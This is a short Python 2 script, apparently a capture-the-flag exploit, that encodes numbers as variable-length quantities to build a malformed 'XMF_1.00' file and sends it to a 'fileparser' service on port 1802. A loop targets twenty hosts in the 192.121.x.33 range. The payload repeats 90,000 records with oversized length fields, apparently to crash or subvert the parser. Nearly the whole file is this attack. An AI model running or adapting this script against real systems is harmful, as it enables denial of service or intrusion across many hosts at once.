from zio import *
import socket
def tobits(n, _group=8, _sep='_', _pad=False):
	'Express n as binary bits with separator'
	bits = '{0:b}'.format(n)[::-1]
	if _pad:
		bits = '{0:0{1}b}'.format(n,((_group+len(bits)-1)//_group)*_group)[::-1]
		answer = _sep.join(bits[i:i+_group]
			for i in range(0, len(bits), _group))[::-1]
		answer = '0'*(len(_sep)-1) + answer
	else:
		answer = _sep.join(bits[i:i+_group]
			for i in range(0, len(bits), _group))[::-1]
	return answer
 
def tovlq(n):
	return tobits(n, _group=7, _sep='1_', _pad=True)
 
def toint(vlq):
	return int(''.join(vlq.split('_1')), 2)    
 
def vlqsend(vlq):
	for i, byte in enumerate(vlq.split('_')[::-1]):
		print('Sent byte {0:3}: {1:#04x}'.format(i, int(byte,2)))

def vlq(s):
	s = tovlq(s)
	l = s.split('_')
	res = ""
	for i in l:
		res += chr(int(i, 2))
	return res[::-1]

print vlq(12345678)
#p = process('./fileparser')
ip=""
port = 1802
#192.121.xx.33
for i in range(1,21):
	ip="192.121."+str(i)+".33"
	p=socket.socket()
	#p=zio('./fileparser')
	#p=zio("192.121.1.33",port)	
	p.connect((ip, port))
	f = 'XMF_1.00' + vlq(1) * 2 + vlq(0x1) + vlq(0x10) + 'ABCD' 
	f += 90000*(vlq(0xffffff) + vlq(30000) + vlq(len(vlq(0xffffff) + vlq(100000)+ vlq(0x0) + vlq(1)) + 1) + vlq(0x0) + vlq(1) + '1')
	p.send(str(len(f))+'\n')
	print len(f)
	p.send(f+'\n')
	print p.recv()
	p.close()
